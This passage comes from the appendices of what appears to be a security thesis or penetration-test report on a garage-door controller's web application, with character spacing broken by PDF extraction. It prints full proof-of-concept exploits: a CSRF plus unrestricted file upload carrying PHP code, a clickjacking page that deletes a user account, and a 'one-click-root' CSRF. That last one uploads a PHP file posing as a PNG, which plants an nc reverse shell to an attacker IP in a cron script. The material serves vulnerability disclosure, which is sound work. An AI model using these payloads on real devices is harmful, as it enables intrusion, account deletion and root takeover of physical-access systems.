" \ x3c ? php p h p i n f o () ?\ x3e \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ "

d s o u n d c l o s e t i m e 1 \ " \ r \ n " +

" \ r \ n " +
" 30\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " sound - type2 \ " \

r \ n " +

\ n " +

r \ n " +

r \ n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s o u n d o p e n 2 \ " \ r

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s o u n d c l o s e 2 \ " \

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " sound - type3 \ " \

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s o u n d o p e n 3 \ " \ r

\ n " +

" \ r \ n " +

APPENDIX C. POC FOR CSRF & UNRESTRICTED FILE UPLOADING
119

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s o u n d c l o s e 3 \ " \

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " op \ " \ r \ n " +
" \ r \ n " +
" c o n f i g \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " opc \ " \ r \ n " +
" \ r \ n " +
" sound \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " form - sound \ " \ r

r \ n " +

\ n " +

" \ r \ n " +
" sound \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y 0 0 w K B 2 D v O 9 w A e e B A - -\ r \ n " ;

var aBody = new U i n t 8 A r r a y ( body . l e n g t h ) ;
for ( var i = 0; i < aBody . l e n g t h ; i ++)

aBody [ i ] = body . c h a r C o d e A t ( i ) ;

xhr . send ( new Blob ([ aBody ]) ) ;

}

</ s c r i p t >
< form a c t i o n = " # " >

< input type = " b u t t o n " value = " S u b m i t r e q u e s t " o n c l i c k = "

s u b m i t R e q u e s t () ; " / >
</ form >

</ body >

88
89 </ html >

Listing C.2: PoC for CSRF and unrestricted ﬁle uploading for the functionality
of uploading sound ﬁles

Appendix D

PoC for Clickjacking

The exploitation phase found the web application of the controller to be vul-
nerable to clickjacking. Description of clickjacking and how the test was made
is found in section 5.5. Below is the PoC of how to delete a user account if
there exist two additional user accounts. It was generated by using Burp Suite
Professional.

1 < div id = " c o n t a i n e r " style = " clip - path : none ; clip : auto ; o v e r f l o w :

v i s i b l e ; p o s i t i o n : a b s o l u t e ; left :0; top :0; width : 1 0 0 % ; h e i g h t
:100% " >

2 <! -- C l i c k j a c k i n g PoC G e n e r a t e d by Burp Suite P r o f e s s i o n a l -- >
3 < input id = " c l i c k j a c k _ f o c u s " style = " o p a c i t y :0; p o s i t i o n : a b s o l u t e ;

left : -5000 px ; " >

4 < h2 style = " padding - left : 10 px ; " > Click below to win ! </ h2 >
5 <p style = " padding - left : 10 px ; " > C o n g r a t u l a t i o n s , you have been

s e l e c t e d out of 1 m i l i o n v i s i t o r s to have a c h a n c e to win a
new phone ! </ p >

6 < div id = " c l i c k j a c k _ b u t t o n " style = " o p a c i t y : 1; transform - style :
preserve -3 d ; text - align : c e n t e r ; font - f a m i l y : Arial ; font -
size : 100%; width : 60 px ; h e i g h t : 60 px ; z - index : 0;
background - color : red ; color : rgb (255 , 255 , 255) ; p o s i t i o n :
a b s o l u t e ; left : 200 px ; top : 200 px ; " > < div style = " p o s i t i o n :
r e l a t i v e ; top : 50%; t r a n s f o r m : t r a n s l a t e Y ( -50%) ; " > Click </ div > <
/ div >

7 <! -- Show this e l e m e n t when c l i c k j a c k i n g is c o m p l e t e -- >
8 < div id = " c l i c k j a c k _ c o m p l e t e " style = " d i s p l a y : none ; - webkit -

transform - style : preserve -3 d ; - moz - transform - style : preserve
-3 d ; transform - style : preserve -3 d ; font - f a m i l y : Arial ; font - size
:16 pt ; color : red ; text - align : c e n t e r ; width : 1 0 0 % ; h e i g h t : 1 0 0 % ; " > <
div style = " p o s i t i o n : r e l a t i v e ; top : 50%; t r a n s f o r m : t r a n s l a t e Y
( -50%) ; " > You ' ve been c l i c k j a c k e d ! </ div > </ div >
9 < i f r a m e id = " p a r e n t F r a m e " src = " data : text / html ; base64 ,

P H N j c m l w d D 5 3 a W 5 k b 3 c u Y W R k R X Z l b n R M a X N 0 Z W 5 l c i g i b W V z c 2 F n Z S I s I G Z 1

b m N 0 a W 9 u K G U p e y B 2 Y X I g Z G F 0 Y S w g Y 2 h p b G R G c m F t Z S A 9 I G R v Y 3 V t Z W 5 0 L m d l

d E V s Z W 1 l b n R C e U l k K C J j a G l s Z E Z y Y W 1 l I i k 7 I H R y e S B 7 I G R h d G E g P S B K U 0 9 O

L n B h c n N l K G U u Z G F 0 Y S k 7 I H 0 g Y 2 F 0 Y 2 g o Z S l 7 I G R h d G E g P S B 7 f T s g f S B

p Z i g h Z G F 0 Y S 5 j b G l j a 2 J h b m R p d C l 7 I H J l d H V y b i B m Y W x z Z T s g f S B j a G l s Z E Z

120

APPENDIX D. POC FOR CLICKJACKING

121

y Y W 1 l L n N 0 e W x l L n d p Z H R o I D 0 g Z G F 0 Y S 5 k b 2 N X a W R 0 a C s i c H g i O 2 N o a W x k R n J

h b W U u c 3 R 5 b G U u a G V p Z 2 h 0 I D 0 g Z G F 0 Y S 5 k b 2 N I Z W l n a H Q r I n B 4 I j t j a G l s Z E Z

y Y W 1 l L n N 0 e W x l L m x l Z n Q g P S B k Y X R h L m x l Z n Q r I n B 4 I j t j a G l s Z E Z y Y W 1 l L n N

0

e W x l L n R v c C A 9 I G R h d G E u d G 9 w K y J w e C I 7 f S w g Z m F s c 2 U p O z w v c 2 N y a X B 0 P j x
p Z n J h b W U g c 3 J j P S J o d H R w O i 8 v M T k y L j E 2 O C 4 x L j E w M C 9 p b m R l e C 5 w a H A / b3A

9

Y 2 9 u Z m l n J i M z O D t v c G M 9 d X N l c n M m I z M 1 O 3 N l Y X J j a C 1 s a X N 0 I i B z Y 3 J v b G x
p b m c 9 I m 5 v I i B z d H l s Z T 0 i d 2 l k d G g 6 M T k w N H B 4 O 2 h l a W d o d D o 2 M z J w e D t w b 3 N

p d G l v b j p h Y n N v b H V 0 Z T t s Z W Z 0 O i 0 x M j I 1 c H g 7 d G 9 w O i 0 z N D F w e D t i b 3 J k Z X I

6

M D s i I G Z y Y W 1 l Y m 9 y Z G V y P S I w I i B p Z D 0 i Y 2 h p b G R G c m F t Z S I g b 2 5 s b 2 F k P S J
w Y X J l b n Q u c G 9 z d E 1 l c 3 N h Z 2 U o S l N P T i 5 z d H J p b m d p Z n k o e 2 N s a W N r Y m F u Z G l
0 O j F 9 K S w n K i c p I j 4 8 L 2 l m c m F t Z T 4 = " s c r o l l i n g = " no " style = " -ms -

t r a n s f o r m : scale (1.0) ; - ms - transform - o r i g i n : 200 px 200 px ;
t r a n s f o r m : scale (1.0) ; - moz - t r a n s f o r m : scale (1.0) ; - moz -
transform - o r i g i n : 200 px 200 px ; -o - t r a n s f o r m : scale (1.0) ; -o -
transform - o r i g i n : 200 px 200 px ; - webkit - t r a n s f o r m : scale (1.0)
; - webkit - transform - o r i g i n : 200 px 200 px ; o p a c i t y :0.0; b o r d e r :0;
p o s i t i o n : a b s o l u t e ;z - index :1; width :1904 px ; h e i g h t :632 px ; left :0
px ; top :0 px " f r a m e b o r d e r = " 0 " > </ i f r a m e >

10 </ div >
11 < s c r i p t > f u n c t i o n f i n d P o s ( obj ) {
var left = 0 , top = 0;
12
if ( obj . o f f s e t P a r e n t ) {

13

while (1) {

left += obj . o f f s e t L e f t ;
top += obj . o f f s e t T o p ;
if (! obj . o f f s e t P a r e n t ) {

break ;

}
obj = obj . o f f s e t P a r e n t ;

}

} else if ( obj . x && obj . y ) {

left += obj . x ;
top += obj . y ;

14

15

16

17

18

19

20

21

22

23

24

25

}
r e t u r n [ left , top ];

26
27 } f u n c t i o n g e n e r a t e C l i c k A r e a ( pos ) {
28

var e l e m e n t W i d t h , e l e m e n t H e i g h t , x , y , p a r e n t F r a m e =
d o c u m e n t . g e t E l e m e n t B y I d ( ' p a r e n t F r a m e ') , d e s i r e d X = 200 ,
d e s i r e d Y = 200 , p a r e n t O f f s e t W i d t h , p a r e n t O f f s e t H e i g h t ,
docWidth , docHeight ,

29

30

31

32

33

34

35

36

37

38

btn = d o c u m e n t . g e t E l e m e n t B y I d ( ' c l i c k j a c k _ b u t t o n ') ;
if ( pos < w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g . l e n g t h ) {

c l i c k j a c k C o m p l e t e d ( false ) ;
e l e m e n t W i d t h = w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g [

pos ]. width ;

e l e m e n t H e i g h t = w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g [

pos ]. h e i g h t ;

btn . style . width = e l e m e n t W i d t h + 'px ';
btn . style . h e i g h t = e l e m e n t H e i g h t + 'px ';
w i n d o w . c l i c k b a n d i t . e l e m e n t W i d t h = e l e m e n t W i d t h ;
w i n d o w . c l i c k b a n d i t . e l e m e n t H e i g h t = e l e m e n t H e i g h t ;
x = w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g [ pos ]. left ;

122

APPENDIX D. POC FOR CLICKJACKING

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

y = w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g [ pos ]. top ;
d o c W i d t h = w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g [ pos ].

d o c u m e n t W i d t h ;

d o c H e i g h t = w i n d o w . c l i c k b a n d i t . c o n f i g . c l i c k T r a c k i n g [ pos

]. d o c u m e n t H e i g h t ;

p a r e n t O f f s e t W i d t h = d e s i r e d X - x ;
p a r e n t O f f s e t H e i g h t = d e s i r e d Y - y ;
p a r e n t F r a m e . style . width = d o c W i d t h + ' px ';
p a r e n t F r a m e . style . h e i g h t = d o c H e i g h t + ' px ';
p a r e n t F r a m e . c o n t e n t W i n d o w . p o s t M e s s a g e ( JSON . s t r i n g i f y ({

c l i c k b a n d i t : 1 , d o c W i d t h : docWidth , d o c H e i g h t : docHeight ,
left : p a r e n t O f f s e t W i d t h , top : p a r e n t O f f s e t H e i g h t }) , '* ') ;

c a l c u l a t e B u t t o n S i z e ( g e t F a c t o r ( p a r e n t F r a m e ) ) ;
s h o w B u t t o n () ;
if ( p a r e n t F r a m e . style . o p a c i t y === '0 ') {

c a l c u l a t e C l i p () ;

}
} else {

r e s e t C l i p () ;
h i d e B u t t o n () ;
c l i c k j a c k C o m p l e t e d ( true ) ;

}

56
57 } f u n c t i o n h i d e B u t t o n () {
58

59
60 } f u n c t i o n s h o w B u t t o n () {
61

var btn = d o c u m e n t . g e t E l e m e n t B y I d ( ' c l i c k j a c k _ b u t t o n ') ;
btn . style . o p a c i t y = 0;

var btn = d o c u m e n t . g e t E l e m e n t B y I d ( ' c l i c k j a c k _ b u t t o n ') ;
btn . style . o p a c i t y = 1;

62
63 } f u n c t i o n c l i c k j a c k C o m p l e t e d ( show ) {
64

var c o m p l e t e = d o c u m e n t . g e t E l e m e n t B y I d ( ' c l i c k j a c k _ c o m p l e t e ')
;
if ( show ) {

c o m p l e t e . style . d i s p l a y = ' block ';

} else {

c o m p l e t e . style . d i s p l a y = ' none ';

}

69
70 } w i n d o w . a d d E v e n t L i s t e n e r ( " m e s s a g e " , f u n c t i o n h a n d l e M e s s a g e s ( e ) {
71

var data ;
try {

data = JSON . parse ( e . data ) ;

} catch ( e ) {

data = {};

}
if (! data . c l i c k b a n d i t ) {

r e t u r n false ;

}
s h o w B u t t o n () ;

80
81 } , false ) ;
82 w i n d o w . a d d E v e n t L i s t e n e r ( " blur " , f u n c t i o n () { if ( w i n d o w .

83

84

c l i c k b a n d i t . m o u s e o v e r ) { h i d e B u t t o n () ;
s e t T i m e o u t ( f u n c t i o n () { g e n e r a t e C l i c k A r e a (++ w i n d o w .
c l i c k b a n d i t . c o n f i g . c u r r e n t P o s i t i o n ) ;
d o c u m e n t . g e t E l e m e n t B y I d ( " c l i c k j a c k _ f o c u s " ) . fo cus () ;} ,1000) ;
} } , false ) ;

85 d o c u m e n t . g e t E l e m e n t B y I d ( " p a r e n t F r a m e " ) . a d d E v e n t L i s t e n e r ( "

m o u s e o v e r " , f u n c t i o n () { w i n d o w . c l i c k b a n d i t . m o u s e o v e r = true ;
} , false ) ;

86 d o c u m e n t . g e t E l e m e n t B y I d ( " p a r e n t F r a m e " ) . a d d E v e n t L i s t e n e r ( "

m o u s e o u t " , f u n c t i o n () { w i n d o w . c l i c k b a n d i t . m o u s e o v e r = false ;

65

66

67

68

72

73

74

75

76

77

78

79

APPENDIX D. POC FOR CLICKJACKING

123

} , false ) ;

87 </ s c r i p t >
88 < s c r i p t > w i n d o w . c l i c k b a n d i t ={ mode : " r e v i e w " , m o u s e o v e r : false ,

e l e m e n t W i d t h :60 , e l e m e n t H e i g h t :60 , c o n f i g :{ " c l i c k T r a c k i n g " :[{ "
width " :60 , " h e i g h t " :60 , " m o u s e X " :1451 , " m o u s e Y " :565 , " left "
:1425 , " top " :541 , " d o c u m e n t W i d t h " :1904 , " d o c u m e n t H e i g h t " :632}] ,
" c u r r e n t P o s i t i o n " :0}};
89 f u n c t i o n c a l c u l a t e C l i p () {
90

var btn = d o c u m e n t . g e t E l e m e n t B y I d ( ' c l i c k j a c k _ b u t t o n ') , w =
btn . o f f s e t W i d t h , h = btn . o f f s e t H e i g h t , c o n t a i n e r = d o c u m e n t .
g e t E l e m e n t B y I d ( ' container ') , x = btn . offsetLeft , y = btn .
o f f s e t T o p ;
c o n t a i n e r . style . o v e r f l o w = ' hidden ';
c o n t a i n e r . style . clip = ' rect ( '+ y + ' px , '+( x + w ) + ' px , '+( y + h ) + '
px , '+ x + ' px ) ';
c o n t a i n e r . style . c l i p P a t h = ' inset ( '+ y + ' px '+( x + w ) + ' px '+( y + h
) + ' px '+ x + ' px ) ';

91

92

93

94 } f u n c t i o n c a l c u l a t e B u t t o n S i z e ( f a c t o r ) {
95

var btn = d o c u m e n t . g e t E l e m e n t B y I d ( ' c l i c k j a c k _ b u t t o n ') ,
r e s i z e d W i d t h = Math . round ( w i n d o w . c l i c k b a n d i t . e l e m e n t W i d t h *
f a c t o r ) , r e s i z e d H e i g h t = Math . round ( w i n d o w . c l i c k b a n d i t .
e l e m e n t H e i g h t * f a c t o r ) ;
btn . style . width = r e s i z e d W i d t h + 'px ';
btn . style . h e i g h t = r e s i z e d H e i g h t + 'px ';
if ( f a c t o r > 100) {

btn . style . f o n t S i z e = '400% ';

} else {

btn . style . f o n t S i z e = ( f a c t o r * 100) + '% ';

}

102
103 } f u n c t i o n r e s e t C l i p () {
104

var c o n t a i n e r = d o c u m e n t . g e t E l e m e n t B y I d ( ' container ') ;
c o n t a i n e r . style . o v e r f l o w = ' visible ';
c o n t a i n e r . style . clip = ' auto ';
c o n t a i n e r . style . c l i p P a t h = ' none ';

107
108 } f u n c t i o n g e t F a c t o r ( obj ) {
109

if ( t y p e o f obj . style . t r a n s f o r m === ' string ') {

r e t u r n obj . style . t r a n s f o r m . r e p l a c e (/[^\ d .]/ g , ' ') ;

}
if ( t y p e o f obj . style . m s T r a n s f o r m === ' string ') {

r e t u r n obj . style . m s T r a n s f o r m . r e p l a c e (/[^\ d .]/ g , ' ') ;

}
if ( t y p e o f obj . style . M o z T r a n s f o r m === ' string ') {

r e t u r n obj . style . M o z T r a n s f o r m . r e p l a c e (/[^\ d .]/ g , ' ') ;

}
if ( t y p e o f obj . style . o T r a n s f o r m === ' string ') {

r e t u r n obj . style . o T r a n s f o r m . r e p l a c e (/[^\ d .]/ g , ' ') ;

}
if ( t y p e o f obj . style . w e b k i t T r a n s f o r m === ' string ') {

r e t u r n obj . style . w e b k i t T r a n s f o r m . r e p l a c e (/[^\ d .]/ g , ' ') ;

96

97

98

99

100

101

105

106

110

111

112

113

114

115

116

117

118

119

120

121

122

123

}
r e t u r n 1;

124
125 } </ s c r i p t >

Listing D.1: PoC for clickjacking attack to delete user account

Appendix E

PoC for One-click-root

PoC for the one-click-root attack described in section 5.17.4. It exploits three
vulnerabilities: CSRF, unrestricted ﬁle upload and privilege escalation.

1 < s c r i p t > h i s t o r y . p u s h S t a t e ( ' ' , ' ' , '/ ') </ s c r i p t >
2

< s c r i p t >

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

f u n c t i o n s u b m i t R e q u e s t () {

var xhr = new X M L H t t p R e q u e s t () ;
xhr . open ( " POST " , " http : \ / \ / 1 9 2 . 1 6 8 . 1 . 1 0 0 \ / index . php " ,

true ) ;

xhr . s e t R e q u e s t H e a d e r ( " Content - Type " , " m u l t i p a r t \/ form -

data ; b o u n d a r y = - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c " ) ;

xhr . s e t R e q u e s t H e a d e r ( " A c c e p t " , " text \/ html , a p p l i c a t i o n \/

xhtml + xml , a p p l i c a t i o n \/ xml ; q =0.9 , image \/ webp , image \/ apng
, * \ / * ; q =0.8 , a p p l i c a t i o n \/ signed - e x c h a n g e ; v = b3 ; q =0.9 " ) ;

xhr . s e t R e q u e s t H e a d e r ( " Accept - L a n g u a g e " , " en - US , en ; q =0.9 "

) ;

" +

xhr . w i t h C r e d e n t i a l s = true ;
var body = " - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n

" Content - D i s p o s i t i o n : form - data ; name =\ " M A X _ F I L E _ S I Z E \

" \ r \ n " +

" \ r \ n " +
" 2 0 0 0 0 0 0 0 \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e n a b l e 1 \ " \ r \ n "

+

+

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " mode1 \ " \ r \ n " +
" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d t i m e 1 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " master - door1 \ "

\ r \ n " +

124

APPENDIX E. POC FOR ONE-CLICK-ROOT

125

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m a g e s 1 \ " \ r \ n "

+

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g o p e n 1 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f o p e n 1 \ " \ r \

n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g c l o s e 1 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f c l o s e 1 \ " \ r

\ n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d n a m e 1 \ " \ r \ n "

+

+

+

+

" \ r \ n " +
" a l o h m o r a \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s e n s o r 1 \ " \ r \ n "

" \ r \ n " +
" 3\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door1 \ " \ r \ n " +
" \ r \ n " +
" 35 EB \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e n a b l e 2 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " mode2 \ " \ r \ n " +
" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d t i m e 2 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +

126

APPENDIX E. POC FOR ONE-CLICK-ROOT

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

106

107

108

109

110

111

112

113

114

115

116

117

118

119

120

121

122

123

124

125

" Content - D i s p o s i t i o n : form - data ; name =\ " i m a g e s 2 \ " \ r \ n "

+

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g c l o s e 2 \ " ;

f i l e n a m e =\ " i s m a r t g a t e _ i c o n . php \ " \ r \ n " +

" Content - Type : image / png \ r \ n " +
" \ r \ n " +
" \ x 8 9 P N G \ r \ n " +
" \ x1a \ n " +
" \ x3c ? php \ r \ n " +
" $file = \ " / var / www / cron / c h e c k E x p i r a t i o n D a t e . php \ " ;\ r \

n " +

" $ h a n d l e r = fopen ( $file , \ ' a \ ') ;\ r \ n " +
" $ s t r i n g = \ '\ x3c ? php s y s t e m (\ " nc 1 9 2 . 1 6 8 . 1 . 1 0 4 1337 -

e / bin / bash \ " ) ; ?\ x3e \ ';\ r \ n " +

" f w r i t e ( $handler , $ s t r i n g ) ;\ r \ n " +
" f c l o s e ( $ h a n d l e r ) ;\ r \ n " +
" ?\ x3e \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f c l o s e 2 \ " \ r

\ n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d n a m e 2 \ " \ r \ n "

+

+

+

+

+

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s e n s o r 2 \ " \ r \ n "

" \ r \ n " +
" 3\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door2 \ " \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e n a b l e 3 \ " \ r \ n "

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " mode3 \ " \ r \ n " +
" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d t i m e 3 \ " \ r \ n "

" \ r \ n " +
" 1\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m a g e s 3 \ " \ r \ n "

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +

APPENDIX E. POC FOR ONE-CLICK-ROOT

127

126

127

128

129

130

131

132

133

134

135

136

137

138

139

140

141

142

143

144

145

146

147

148

149

150

151

152

153

154

155

156

157

158

159

160

161

162

163

164

165

166

167

168

169

170

171

172

173

174

175

" Content - D i s p o s i t i o n : form - data ; name =\ " i m g o p e n 3 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f o p e n 3 \ " \ r \

n " +

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " i m g c l o s e 3 \ " ;

f i l e n a m e =\ " \ " \ r \ n " +

" Content - Type : a p p l i c a t i o n / octet - s t r e a m \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " e x i f c l o s e 3 \ " \ r

\ n " +

+

+

" \ r \ n " +
" 0\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " d n a m e 3 \ " \ r \ n "

" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " s e n s o r 3 \ " \ r \ n "

" \ r \ n " +
" 3\ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " door3 \ " \ r \ n " +
" \ r \ n " +
" \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " op \ " \ r \ n " +
" \ r \ n " +
" c o n f i g \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
" Content - D i s p o s i t i o n : form - data ; name =\ " opc \ " \ r \ n " +
" \ r \ n " +
" doors \ r \ n " +
" - - - - - - W e b K i t F o r m B o u n d a r y Q g 9 v g 2 K 6 w P U A 8 G C c \ r \ n " +
